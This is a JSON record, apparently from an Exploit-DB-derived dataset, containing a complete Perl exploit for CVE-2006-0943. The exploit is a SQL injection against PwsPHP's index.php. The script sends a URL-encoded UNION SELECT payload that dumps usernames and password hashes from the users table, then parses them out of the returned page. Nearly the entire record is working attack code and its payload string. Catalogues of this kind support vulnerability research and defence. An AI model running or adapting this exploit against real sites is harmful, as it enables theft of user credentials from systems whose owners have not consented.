{
  "id": "1532",
  "title": "PwsPHP 1.2.3 - &#039;index.php&#039; SQL Injection",
  "cve": "CVE-2006-0943",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n# PwsPHP <= 1.2.4 (index.php) Remote SQL Injection Exploit\r\n# http://example.com/index.php?mod=sondages&do=results&id=1%20union%20select%20id,0,0,pseudo,pass,pseudo,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20%60users%60%20/*\r\n# Discovered by: papipsycho (papipsycho.com) (WOrlddefacers.de)\r\n# ported by str0ke (milw0rm.com)\r\n\r\nuse LWP::Simple;\r\n\r\n$serv     =  $ARGV[0];\r\n$path     =  $ARGV[1];\r\n\r\nsub usage\r\n {\r\n    print \"\\nPwsPHP <= 1.2.4 (index.php) Remote SQL Injection Exploit\\n\";\r\n    print \"Discovered by: papipsycho (papipsycho.com)\\n\";\r\n    print \"Ported by str0ke (milw0rm.com)\\n\";\r\n    print \"Usage: $0 www.example.com /directory/\\n\";\r\n    print \"sever    -  URL\\n\";\r\n    print \"path     -  path to index.php\\n\";\r\n    exit ();\r\n}\r\n\r\nsub exploit\r\n {\r\n    print qq(\r\n    PwsPHP <= 1.2.4 (index.php) Remote SQL Injection Exploit\r\n    Discovered by: papipsycho (papipsycho.com)\r\n    Ported by str0ke (milw0rm.com)\\n\\n);\r\n\r\n    $string= \"index.php?mod=sondages&do=results&id=1%20union%20select%20id,0,0,pseudo,pass,pseudo,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20%60users%60%20/*\";\r\n    $url = sprintf(\"http://%s%s%s\",$serv,$path,$string);\r\n    $content = get \"$url\";\r\n    @contents = split(/\\n/, $content);\r\n    foreach $line (@contents) {\r\n    if ($line =~ /(\\<center\\>\\<b\\>)(.*?)(\\<\\/b\\>\\<\\/center\\>\\<br\\>\\<br\\>)/){&username;}\r\n    if ($line =~ /(\\<td\\>)(\\w{32})(\\<\\/td\\>)/){&password;}\r\n    }\r\n}\r\n\r\nsub username { print \"[*] Username: $2\\n\";}\r\nsub password { print \"[*] Hash: $2\\n\\n\";}\r\n\r\nif (@ARGV != 2){&usage;}else{&exploit;}\r\n\r\n# milw0rm.com [2006-02-25]",
  "url": "https://www.exploit-db.com/exploits/1532"
}